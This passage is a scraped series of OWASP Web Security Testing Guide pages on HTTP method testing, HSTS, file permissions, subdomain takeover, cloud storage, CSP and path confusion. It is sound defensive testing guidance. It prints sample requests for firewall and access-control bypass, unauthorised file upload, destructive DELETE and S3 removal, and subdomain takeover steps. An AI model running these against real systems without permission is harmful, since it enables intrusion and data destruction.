shown below. This can occasionally be useful to evade a web application firewall, or any other filtering that blocks specific methods.\n\n```http\nFOO / HTTP/1.1\nHost: example.org\n```\n\nRequests with arbitrary methods can also be made using curl with the `-X` option:\n\n```bash\ncurl -X FOO https://example.org\n```\n\nThere are also a variety of automated tools that can attempt to determine supported methods, such as the [`http-methods`](https://nmap.org/nsedoc/scripts/http-methods.html) Nmap script. However, these tools may not test for dangerous methods (i.e., methods that may cause changes such as `PUT` or `DELETE`), or may unintentionally cause changes to the web server if these methods are supported. As such, they should be used with care.\n\n### PUT and DELETE\n\nThe `PUT` and `DELETE` methods can have different effects, depending on whether they are being interpreted by the web server or by the application running on it.\n\n#### Legacy Web Servers\n\nSome legacy web servers allowed the use of the `PUT` method to create files on the server. For example, if the server is configured to allow this, the request below would create a file on the server called `test.html` with the contents `<script>alert(1)</script>`.\n\n```http\nPUT /test.html HTTP/1.1\nHost: example.org\nContent-Length: 25\n\n<script>alert(1)</script>\n```\n\nSimilar requests can also be made with cURL:\n\n```bash\ncurl https://example.org --upload-file test.html\n```\n\nThis allows an attacker to upload arbitrary files to the webserver, which could potentially result in a full system compromise if they are allowed to upload executable code such as PHP files. However, this configuration is extremely rare, and is unlikely to be seen on modern systems.\n\nSimilarly, the `DELETE` method can be used to delete files from the webserver. Please note that this is a **destructive action**; therefore, extreme care should be exercised when testing this method.\n\n```http\nDELETE /test.html HTTP/1.1\nHost: example.org\n```\n\nOr with cURL:\n\n```bash\ncurl https://example.org/test.html -X DELETE\n```\n\n#### RESTful APIs\n\nBy contrast, the `PUT` and `DELETE` methods are commonly used by modern RESTful applications to create and delete objects. For example, the API request below could be used to create a user called \"foo\" with a role of \"user\":\n\n```http\nPUT /api/users/foo HTTP/1.1\nHost: example.org\nContent-Length: 34\n\n{\n    \"role\": \"user\"\n}\n```\n\nA similar request with the DELETE method could be used to delete an object.\n\n```http\nDELETE /api/users/foo HTTP/1.1\nHost: example.org\n```\n\nAlthough it may be reported by automated scanning tools, the presence of these methods on a RESTful API **is not a security issue**. However, this functionality may have other vulnerabilities (such as weak access control), and should be thoroughly tested.\n\n### TRACE\n\nThe `TRACE` method (or Microsoft's equivalent `TRACK` method) causes the server to echo back the contents of the request. This led to a vulnerability called Cross-Site Tracing (XST) to be published in [2003](https://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf) (PDF), which could be used to access cookies that had the `HttpOnly` flag set. The `TRACE` method has been blocked in all browsers and plugins for many years; as such, this issue is no longer exploitable. However, it may still be flagged by automated scanning tools, and the `TRACE` method being enabled on a web server suggests that is has not been properly hardened.\n\n### CONNECT\n\nThe `CONNECT` method causes the web server to open a TCP connection to another system, and then pass traffic from the client to that system. This could allow an attacker to proxy traffic through the server, in order to hide their source address, access internal systems or access services that are bound to localhost. An example of a `CONNECT` request is shown below:\n\n```http\nCONNECT 192.168.0.1:443 HTTP/1.1\nHost: example.org\n```\n\n### PATCH\n\nThe `PATCH` method is defined in [RFC 5789](https://datatracker.ietf.org/doc/html/rfc5789), and is used to provide instructions on how an object should be modified. The RFC itself does not define what format these instructions should be in, but various methods are defined in other standards, such as the [RFC 6902 - JavaScript Object Notation (JSON) Patch](https://datatracker.ietf.org/doc/html/rfc6902).\n\nFor example, if we have a user called \"foo\" with the following properties:\n\n```json\n{\n    \"role\": \"user\",\n    \"email\": \"foo@example.org\"\n}\n```\n\nThe following JSON PATCH request could be used to change the role of this user to \"admin\", without modifying the email address:\n\n```http\nPATCH /api/users/foo HTTP/1.1\nHost: example.org\n\n{ \"op\": \"replace\", \"path\": \"/role\", \"value\": \"admin\" }\n```\n\nAlthough the RFC states that it should include instructions for how the object should be modified, the `PATCH` method is commonly (mis)used to include the changed content instead, as shown below. Much like the previous request, this would change the \"role\" value to \"admin\" without modifying the rest of the object. This is in contrast to the `PUT` method, which would overwrite the entire object, and thus result in an object with no \"email\" attribute.\n\n```http\nPATCH /api/users/foo HTTP/1.1\nHost: example.org\n\n{\n    \"role\": \"admin\"\n}\n```\n\nAs with the `PUT` method, this functionality may have access control weaknesses or other vulnerabilities. Additionally, applications may not perform the same level of input validation when modifying an object as they do when creating one. This could potentially allow malicious values to be injected (such as in a stored cross-site scripting attack), or could allow broken or invalid objects that may result in business logic related issues.\n\n### Testing for Access Control Bypass\n\nIf a page on the application redirects users to a login page with a 302 code when they attempt to access it directly, it may be possible to bypass this by making a request with a different HTTP method, such as `HEAD`, `POST` or even a made up method such as `FOO`. If the web application responds with a `HTTP/1.1 200 OK` rather than the expected `HTTP/1.1 302 Found`, it may then be possible to bypass the authentication or authorization. The example below shows how a `HEAD` request may result in a page setting administrative cookies, rather than redirecting the user to a login page:\n\n```http\nHEAD /admin/ HTTP/1.1\nHost: example.org\n```\n\n```http\nHTTP/1.1 200 OK\n[...]\nSet-Cookie: adminSessionCookie=[...];\n```\n\nAlternatively, it may be possible to make direct requests to pages that cause actions, such as:\n\n```http\nHEAD /admin/createUser.php?username=foo&password=bar&role=admin HTTP/1.1\nHost: example.org\n```\n\nOr:\n\n```http\nFOO /admin/createUser.php\nHost: example.org\nContent-Length: 36\n\nusername=foo&password=bar&role=admin\n```\n\n### Testing for HTTP Method Overriding\n\nSome web frameworks provide a way to override the actual HTTP method in the request. They achieve this by emulating the missing HTTP verbs and passing some custom headers in the requests. The main purpose of this is to circumvent a middleware application (such as a proxy or web application firewall) which blocks specific methods. The following alternative HTTP headers could potentially be used:\n\n- `X-HTTP-Method`\n- `X-HTTP-Method-Override`\n- `X-Method-Override`\n\nTo test this, consider scenarios where restricted verbs like `PUT` or `DELETE` return a `405 Method not allowed`. In such cases, replay the same request, but add the alternative headers for HTTP method overriding. Then, observe the system's response. The application should respond with a different status code (*e.g.* `200 OK`) in cases where method overriding is supported.\n\nThe web server in the following example does not allow the `DELETE` method and blocks it:\n\n```http\nDELETE /resource.html HTTP/1.1\nHost: example.org\n```\n\n```http\nHTTP/1.1 405 Method Not Allowed\n[...]\n```\n\nAfter adding the `X-HTTP-Method` header, the server responds to the request with a 200:\n\n```http\nGET /resource.html HTTP/1.1\nHost: example.org\nX-HTTP-Method: DELETE\n```\n\n```http\nHTTP/1.1 200 OK\n[...]\n```\n\n## Remediation\n\n- Ensure that only the required methods are allowed and that these methods are properly configured.\n- Ensure that no workarounds are implemented to bypass security measures implemented by user-agents, frameworks, or web servers.\n\n## Tools\n\n- [Ncat](https://nmap.org/ncat/)\n- [cURL](https://curl.haxx.se/)\n- [Nmap http-methods NSE script](https://nmap.org/nsedoc/scripts/http-methods.html)\n\n## References\n\n- [RFC 7231 - Hypertext Transfer Protocol (HTTP/1.1)](https://datatracker.ietf.org/doc/html/rfc7231)\n- [RFC 5789 - PATCH Method for HTTP](https://datatracker.ietf.org/doc/html/rfc5789)\n- [HTACCESS: BILBAO Method Exposed](https://web.archive.org/web/20160616172703/https://www.kernelpanik.org/docs/kernelpanik/bme.eng.pdf)\n- [Fortify - Misused HTTP Method Override](https://vulncat.fortify.com/en/detail?id=desc.dynamic.xtended_preview.often_misused_http_method_override)\n- [Mozilla Developer Network - Safe HTTP Methods](https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP)\n", "timestamp": "2025-10-24T11:39:44.259987"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md", "content": "# Test HTTP Strict Transport Security\n\n|ID          |\n|------------|\n|WSTG-CONF-07|\n\n## Summary\n\nThe HTTP Strict Transport Security (HSTS) feature enables a web server to inform the user's browser, via a special response header, that it should never establish an unencrypted HTTP connection to the specified domain servers. Instead, it should automatically establish all connection requests to access the site through HTTPS. This also prevents users from overriding certificate errors.\n\nConsidering the importance of this security measure, it is prudent to verify that the site is using this HTTP header in order to ensure that all the data travels encrypted between the web browser and the server.\n\nThe HTTP strict transport security header uses three specific directives:\n\n- `max-age`: to indicate the number of seconds that the browser should automatically convert all HTTP requests to HTTPS.\n- `includeSubDomains`: to indicate that all related sub-domains must use HTTPS.\n- `preload` Unofficial: to indicate that the domain(s) are on the preload list(s) and that browsers should never connect without HTTPS.\n    - While this is supported by all the major browsers, it is not an official part of the specification. (See [hstspreload.org](https://hstspreload.org/) for more information.)\n\nHere's an example of the HSTS header implementation:\n\n`Strict-Transport-Security: max-age=31536000; includeSubDomains`\n\nThe presence of this header must be checked, as its absence could lead to security issues such as:\n\n- Attackers intercepting and accessing the information transferred over an unencrypted network channel.\n- Attackers carrying out manipulator-in-the-middle (MITM) attacks by taking advantage of users who accept untrusted certificates.\n- Users who mistakenly enter an address in the browser using HTTP instead of HTTPS, or users who click on a link in a web application that incorrectly uses the HTTP protocol.\n\n## Test Objectives\n\n- Review the HSTS header and its validity.\n\n## How to Test\n\n- Confirm the presence of the HSTS header by examining the server's response through an intercepting proxy.\n- Use curl as follows:\n\n```bash\n$ curl -s -D- https://owasp.org | grep -i strict-transport-security:\nStrict-Transport-Security: max-age=31536000\n```\n\n## References\n\n- [OWASP HTTP Strict Transport Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)\n- [OWASP Appsec Tutorial Series - Episode 4: Strict Transport Security](https://www.youtube.com/watch?v=zEV3HOuM_Vw)\n- [HSTS Specification](https://tools.ietf.org/html/rfc6797)\n- [Enable HTTP Strict Transport Security In Apache](https://https.cio.gov/hsts/)\n- [Enable HTTP Strict Transport Security In Nginx](https://www.nginx.com/blog/http-strict-transport-security-hsts-and-nginx/)\n", "timestamp": "2025-10-24T11:39:44.332093"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission.md", "content": "# Test File Permission\n\n|ID          |\n|------------|\n|WSTG-CONF-09|\n\n## Summary\n\nWhen a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution, or sensitive user data.\n\nA clear example would be an executable file that can be run by unauthorized users. For another example, consider account information or a token value used to access an API. These are increasingly seen in modern web services and microservices, and may be stored in a configuration file that has world-readable permissions by default upon installation. Such sensitive data could be exposed either by malicious internal actors within the host system or by remote attackers. The latter may have compromised the service through other vulnerabilities, while gaining only normal user privileges.\n\n## Test Objectives\n\n- Review and identify any rogue file permissions.\n\n## How to Test\n\nIn Linux, use `ls` command to check the file permissions. Alternatively, `namei` can also be used to recursively list file permissions.\n\n`$ namei -l /PathToCheck/`\n\nThe files and directories that require file permission testing can include, but are not limited to, the following:\n\n- Web files/directory\n- Configuration files/directory\n- Sensitive files(encrypted data, password, key)/directory\n- Log files(security logs, operation logs, admin logs)/directory\n- Executables(scripts, EXE, JAR, class, PHP, ASP)/directory\n- Database files/directory\n- Temp files/directory\n- Upload files/directory\n\n## Remediation\n\nSet the permissions of the files and directories properly so that unauthorized users cannot access critical resources.\n\n## Tools\n\n- [Windows AccessEnum](https://technet.microsoft.com/en-us/sysinternals/accessenum)\n- [Windows AccessChk](https://technet.microsoft.com/en-us/sysinternals/accesschk)\n- [Linux namei](https://linux.die.net/man/1/namei)\n\n## References\n\n- [CWE-732: Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)\n", "timestamp": "2025-10-24T11:39:44.510122"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md", "content": "# Test for Subdomain Takeover\n\n|ID          |\n|------------|\n|WSTG-CONF-10|\n\n## Summary\n\nA successful exploitation of this kind of vulnerability allows an adversary to claim and take control of the victim's subdomain. This attack relies on the following:\n\n1. The victim's external DNS server subdomain record is configured to point to a non-existing or non-active resource/external service/endpoint. The proliferation of XaaS (Anything as a Service) products and public cloud services offer a lot of potential targets to consider.\n2. The service provider hosting the resource/external service/endpoint does not handle subdomain ownership verification properly.\n\nIf the subdomain takeover is successful, a wide variety of attacks are possible (serving malicious content, phishing, stealing user session cookies, credentials, etc.). This vulnerability could be exploited for a wide variety of DNS resource records including: `A`, `CNAME`, `MX`, `NS`, `TXT` etc. In terms of the attack severity, an `NS` subdomain takeover (although less likely) has the highest impact, because a successful attack could result in full control over the whole DNS zone and the victim's domain.\n\n### GitHub\n\n1. The victim (victim.com) uses GitHub for development and configured a DNS record (`coderepo.victim.com`) to access it.\n2. The victim decides to migrate their code repository from GitHub to a commercial platform and does not remove `coderepo.victim.com` from their DNS server.\n3. An adversary discovers that `coderepo.victim.com` is hosted on GitHub and claims it using GitHub Pages and their own GitHub account.\n\n### Expired Domain\n\n1. The victim (victim.com) owns another domain (victimotherdomain.com) and uses a CNAME record (www) to reference the other domain (`www.victim.com` --> `victimotherdomain.com`)\n2. At some point, victimotherdomain.com expires, becoming available for registration by anyone. Since the CNAME record is not deleted from the victim.com DNS zone, anyone who registers `victimotherdomain.com` has full control over `www.victim.com` until the DNS record is removed or updated.\n\n## Test Objectives\n\n- Enumerate all possible domains (previous and current).\n- Identify any forgotten or misconfigured domains.\n\n## How to Test\n\n### Black-Box Testing\n\nThe first step is to enumerate the victim DNS servers and resource records. There are multiple ways to accomplish this task; for example, DNS enumeration using a list of common subdomains dictionary, DNS brute force or using web search engines and other OSINT data sources.\n\nUsing the dig command the tester looks for the following DNS server response messages that warrant further investigation:\n\n- `NXDOMAIN`\n- `SERVFAIL`\n- `REFUSED`\n- `no servers could be reached.`\n\n#### Testing DNS A, CNAME Record Subdomain Takeover\n\nPerform a basic DNS enumeration on the victim's domain (`victim.com`) using `dnsrecon`:\n\n```bash\n$ ./dnsrecon.py -d victim.com\n[*] Performing General Enumeration of Domain: victim.com\n...\n[-] DNSSEC is not configured for victim.com\n[*]      A subdomain.victim.com 192.30.252.153\n[*]      CNAME subdomain1.victim.com fictioussubdomain.victim.com\n...\n```\n\nIdentify which DNS resource records are dead and point to inactive/not-used services. Using the dig command for the `CNAME` record:\n\n```bash\n$ dig CNAME fictioussubdomain.victim.com\n; <<>> DiG 9.10.3-P4-Ubuntu <<>> ns victim.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 42950\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n```\n\nThe following DNS responses warrant further investigation: `NXDOMAIN`.\n\nTo test the `A` record the tester performs a whois database lookup and identifies GitHub as the service provider:\n\n```bash\n$ whois 192.30.252.153 | grep \"OrgName\"\nOrgName: GitHub, Inc.\n```\n\nThe tester visits `subdomain.victim.com` or issues a HTTP GET request which returns a \"404 - File not found\" response which is a clear indication of the vulnerability.\n\n![GitHub 404 File Not Found response](images/subdomain_takeover_ex1.jpeg)\\\n*Figure 4.2.10-1: GitHub 404 File Not Found response*\n\nThe tester claims the domain using GitHub Pages:\n\n![GitHub claim domain](images/subdomain_takeover_ex2.jpeg)\\\n*Figure 4.2.10-2: GitHub claim domain*\n\n#### Testing NS Record Subdomain Takeover\n\nIdentify all nameservers for the domain in scope:\n\n```bash\n$ dig ns victim.com +short\nns1.victim.com\nnameserver.expireddomain.com\n```\n\nIn this fictitious example, the tester checks if the domain `expireddomain.com` is active with a domain registrar search. If the domain is available for purchase the subdomain is vulnerable.\n\nThe following DNS responses warrant further investigation: `SERVFAIL` or `REFUSED`.\n\n### Gray-Box Testing\n\nThe tester has the DNS zone file available, which means DNS enumeration is not necessary. The testing methodology is the same.\n\n## Remediation\n\nTo mitigate the risk of subdomain takeover, the vulnerable DNS resource record(s) should be removed from the DNS zone. Continuous monitoring and periodic checks are recommended as best practice.\n\n## Tools\n\n- [dig - man page](https://linux.die.net/man/1/dig)\n- [recon-ng - Web Reconnaissance framework](https://github.com/lanmaster53/recon-ng)\n- [theHarvester - OSINT intelligence gathering tool](https://github.com/laramies/theHarvester)\n- [Sublist3r - OSINT subdomain enumeration tool](https://github.com/aboul3la/Sublist3r)\n- [dnsrecon - DNS Enumeration Script](https://github.com/darkoperator/dnsrecon)\n- [OWASP Amass DNS enumeration](https://github.com/OWASP/Amass)\n- [OWASP Domain Protect](https://owasp.org/www-project-domain-protect)\n\n## References\n\n- [HackerOne - A Guide To Subdomain Takeovers](https://www.hackerone.com/blog/Guide-Subdomain-Takeovers)\n- [Subdomain Takeover: Basics](https://0xpatrik.com/subdomain-takeover-basics/)\n- [Subdomain Takeover: Going beyond CNAME](https://0xpatrik.com/subdomain-takeover-ns/)\n- [can-i-take-over-xyz - A list of vulnerable services](https://github.com/EdOverflow/can-i-take-over-xyz/)\n- [OWASP AppSec Europe 2017 - Frans Rosén: DNS hijacking using cloud providers – no verification needed](https://2017.appsec.eu/presos/Developer/DNS%20hijacking%20using%20cloud%20providers%20%E2%80%93%20no%20verification%20needed%20-%20Frans%20Rosen%20-%20OWASP_AppSec-Eu_2017.pdf)\n", "timestamp": "2025-10-24T11:39:44.646760"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md", "content": "# Test Cloud Storage\n\n|ID          |\n|------------|\n|WSTG-CONF-11|\n\n## Summary\n\nCloud storage services allow web applications and services to store and access objects in the storage service. Improper access control configuration, however, may lead to the exposure of sensitive information, data tampering, or unauthorized access.\n\nA known example is where an Amazon S3 bucket is misconfigured, although the other cloud storage services may also be exposed to similar risks. By default, all S3 buckets are private and can be accessed only by users who are explicitly granted access. Users can grant public access not only to the bucket itself but also to individual objects stored within that bucket. This may lead to an unauthorized user being able to upload new files, modify or read stored files.\n\n## Test Objectives\n\n- Assess that the access control configuration for the storage services is properly in place.\n\n## How to Test\n\nFirst, identify the URL to access the data in the storage service, and then consider the following tests:\n\n- read unauthorized data\n- upload a new arbitrary file\n\nYou may use curl for the tests with the following commands and see if unauthorized actions can be performed successfully.\n\nTo test the ability to read an object:\n\n```bash\ncurl -X GET https://<cloud-storage-service>/<object>\n```\n\nTo test the ability to upload a file:\n\n```bash\ncurl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'\n```\n\nIn the above command, it is recommended to replace the single quotes (') with double quotes (\") when running the command on a Windows machine.\n\n### Testing for Amazon S3 Bucket Misconfiguration\n\nThe Amazon S3 bucket URLs follow one of two formats, either virtual host style or path-style.\n\n- Virtual Hosted Style Access\n\n```text\nhttps://bucket-name.s3.Region.amazonaws.com/key-name\n```\n\nIn the following example, `my-bucket` is the bucket name, `us-west-2` is the region, and `puppy.png` is the key-name:\n\n```text\nhttps://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\n```\n\n- Path-Style Access\n\n```text\nhttps://s3.Region.amazonaws.com/bucket-name/key-name\n```\n\nAs above, in the following example, `my-bucket` is the bucket name, `us-west-2` is the region, and `puppy.png` is the key-name:\n\n```text\nhttps://s3.us-west-2.amazonaws.com/my-bucket/puppy.png\n```\n\nFor some regions, the legacy global endpoint that does not specify a region-specific endpoint can be used. Its format is also either virtual hosted style or path-style.\n\n- Virtual Hosted Style Access\n\n```text\nhttps://bucket-name.s3.amazonaws.com\n```\n\n- Path-Style Access\n\n```text\nhttps://s3.amazonaws.com/bucket-name\n```\n\n#### Identify Bucket URL\n\nFor black-box testing, S3 URLs can be found in the HTTP messages. The following example shows a bucket URL is sent in the `img` tag in an HTTP response.\n\n```html\n...\n<img src=\"https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\">\n...\n```\n\nFor gray-box testing, you can obtain bucket URLs from Amazon's web interface, documents, source code, and any other available sources.\n\n#### Testing with AWS-CLI\n\nIn addition to testing with curl, you can also test with the AWS command-line tool. In this case `s3://` URI scheme is used.\n\n##### List\n\nThe following command lists all the objects of the bucket when it is configured public:\n\n```bash\naws s3 ls s3://<bucket-name>\n```\n\n##### Upload\n\nThe following is the command to upload a file:\n\n```bash\naws s3 cp arbitrary-file s3://bucket-name/path-to-save\n```\n\nThis example shows the result when the upload has been successful.\n\n```bash\n$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload: ./test.txt to s3://bucket-name/test.txt\n```\n\nThis example shows the result when the upload has failed.\n\n```bash\n$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload failed: ./test2.txt to s3://bucket-name/test2.txt An error occurred (AccessDenied) when calling the PutObject operation: Access Denied\n```\n\n##### Remove\n\nThe following is the command to remove an object:\n\n```bash\naws s3 rm s3://bucket-name/object-to-remove\n```\n\n## Tools\n\n- [AWS CLI](https://aws.amazon.com/cli/)\n\n## References\n\n- [Working with Amazon S3 Buckets](https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html)\n- [flAWS 2 - Learn AWS Security](http://flaws2.cloud)\n- [curl Tutorial](https://curl.se/docs/manual.html)\n", "timestamp": "2025-10-24T11:39:44.717746"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md", "content": "# Testing for Content Security Policy\n\n|ID          |\n|------------|\n|WSTG-CONF-12|\n\n## Summary\n\nContent Security Policy (CSP) is a declarative allow-list policy enforced through `Content-Security-Policy` response header or equivalent `<meta>` element. It allows developers to restrict the sources from which resources such as JavaScript, CSS, images, files etc. are loaded. CSP is an effective defense in depth technique to mitigate the risk of vulnerabilities such as Cross Site Scripting (XSS) and Clickjacking.\n\nContent Security Policy supports directives which allow granular control to the flow of policies. (See [References](#references) for further details.)\n\n## Test Objectives\n\n- Review the Content-Security-Policy header or meta element to identify misconfigurations.\n\n## How to Test\n\nTo test for misconfigurations in CSPs, look for insecure configurations by examining the `Content-Security-Policy` HTTP response header or CSP `meta` element in a proxy tool:\n\n- `unsafe-inline` directive enables inline scripts or styles, making the applications susceptible to [XSS](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md) attacks.\n- `unsafe-eval` directive allows `eval()` to be used in the application and is susceptible to common bypass techniques such as data URL injection.\n- `unsafe-hashes` directive allows use of inline scripts/styles, assuming they match the specified hashes.\n- Resources such as scripts can be allowed to be loaded from any origin by the use wildcard (`*`) source.\n    - Also consider wildcards based on partial matches, such as: `https://*` or `*.cdn.com`.\n    - Consider whether allow listed sources provide JSONP endpoints which might be used to bypass CSP or same-origin-policy.\n- Framing can be enabled for all origins by the use of the wildcard (`*`) source for the `frame-ancestors` directive. If the `frame-ancestors` directive is not defined in the Content-Security-Policy header it may make applications vulnerable to [clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md) attacks.\n- Business critical applications should require to use a strict policy.\n\n## Remediation\n\nConfigure a strong content security policy which reduces the attack surface of the application. Developers can verify the strength of content security policy using online tools such as [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/).\n\n### Strict Policy\n\nA strict policy is a policy which provides protection against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.\n\nGoogle went ahead and set up a guide to adopt a strict CSP based on nonces. Based on a presentation at [LocoMocoSec](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55), the following two policies can be used to apply a strict policy:\n\nModerate Strict Policy:\n\n```HTTP\nscript-src 'nonce-r4nd0m' 'strict-dynamic';\nobject-src 'none'; base-uri 'none';\n```\n\nLocked down Strict Policy:\n\n```HTTP\nscript-src 'nonce-r4nd0m';\nobject-src 'none'; base-uri 'none';\n```\n\n- `script-src` directive is used to restrict the sources from which scripts can be loaded and executed.\n- `object-src` directive is used to restrict the sources from which objects can be loaded and executed.\n- `base-uri` directive specifies the base URL for resolving relative URLs in the page. Without this directive, the page becomes vulnerable to HTML base tag injection attacks.\n\n## Tools\n\n- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)\n- [CSP Auditor - Burp Suite Extension](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)\n- [CSP Generator Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc) / [Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)\n\n## References\n\n- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)\n- [Mozilla Developer Network: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)\n- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)\n- [CSP with Google](https://csp.withgoogle.com/docs/index.html)\n- [Content-Security-Policy](https://content-security-policy.com/)\n- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)\n- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)\n- [The unsafe-hashes Source List Keyword](https://content-security-policy.com/unsafe-hashes/)\n", "timestamp": "2025-10-24T11:39:44.809954"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion.md", "content": "# Test Path Confusion\n\n|ID          |\n|------------|\n|WSTG-CONF-13|\n\n## Summary\n\nProper configuration of application paths is important because, if paths are not configured correctly, they allow an attacker to exploit other vulnerabilities at a later stage using this misconfiguration.\n\nFor example, if the routes are not configured correctly and the target also uses a CDN, the attacker can use this misconfiguration to execute web cache deception attacks.\n\nAs a result, to prevent other attacks, this configuration should be evaluated by the tester.\n\n## Test Objectives\n\n- Make sure application paths are configured correctly.\n\n## How To Test\n\n### Black-Box Testing\n\nIn a black-box testing scenario, the tester should replace all the existing paths with paths that do not exist, and then examine the behavior and status code of the target.\n\nFor example, there is a path in the application that is a dashboard and shows the amount of the user's account balance (money, game credits, etc).\n\nAssume the path is `https://example.com/user/dashboard`, the tester should test the different modes that the developer may have considered for this path. For Web Cache Deception vulnerabilities the analyst should consider a path such as `https:// example.com/user/dashboard/non.js` if dashboard information is visible, and the target uses a CDN (or other web cache), then Web Cache Deception attacks are likely applicable.\n\n### White-Box Testing\n\nExamine the application routing configuration, Most of the time, developers use regular expressions in application routing.\n\nIn this example, in the `urls.py` file of a Django framework application, we see an example of Path Confusion. The developer did not use the correct regular expression resulting in a vulnerability:\n\n```python\n    from django.urls import re_path\n    from . import views\n\n    urlpatterns = [\n\n        re_path(r'.*^dashboard', views.path_confusion ,name = 'index'),\n\n    ]\n```\n\nIf the path `https://example.com/dashboard/none.js` is also opened by the user in the browser, the user dashboard information can be displayed, and if the target uses a CDN or web cache, a Web Cache Deception attack can be implemented.\n\n## Tools\n\n- [Zed Attack Proxy](https://www.zaproxy.org)\n- [Burp Suite](https://portswigger.net/burp)\n\n## Remediation\n\n- Refrain from classify/handling cached based on file extension or path (leverage content-type).\n- Ensure the caching mechanism(s) adhere to cache-control headers specified by your application.\n- Implement RFC compliant File Not Found handling and redirects.\n\n## References\n\n- [Bypassing Web Cache Poisoning Countermeasures](https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures)\n- [Path confusion: Web cache deception threatens user information online](https://portswigger.net/daily-swig/path-confusion-web-cache-deception-threatens-user-information-online)\n- [Web Cache Deception Attack](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)\n", "timestamp": "2025-10-24T11:39:44.917629"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations.md", "content": "# Test Other HTTP Security Header Misconfigurations\n\n| ID         |\n|------------|\n|WSTG-CONF-14|\n\n## Summary\n\nSecurity headers play a vital role in protecting web applications from a wide range of attacks, including Cross-Site Scripting (XSS), Clickjacking, and data injection attacks. These headers instruct the browser on how to handle security-related aspects of a website’s communication, reducing exposure to known attack vectors. However, misconfigurations can lead to vulnerabilities, weakening the intended security protections or rendering them ineffective. This section outlines common security header misconfigurations, their risks, and how to properly test for them.\n\n## Test Objectives\n\n- Identify improperly configured security headers.\n- Assess the impact of misconfigured security headers.\n- Validate the correct implementation of required security headers.\n\n## Common Security Header Misconfigurations\n\n- **Security Header with an Empty Value:** Headers that are present but lack a value may be ignored by browsers, making them ineffective.\n- **Security Header with an Invalid Value or Name (Typos):** Incorrect header names or misspellings result in headers not being recognized or enforced.\n- **Overpermissive Security Headers:** Headers configured too broadly (e.g., using wildcard characters `*` or overly permissive directives) can leak information or allow access to resources beyond the intended scope.\n- **Duplicate Security Headers:** Multiple occurrences of the same header with conflicting values can lead to unpredictable browser behavior, potentially disabling the security measures entirely.\n- **Legacy or Deprecated Headers:** Inclusion of obsolete headers (e.g., HPKP) or directives (e.g., 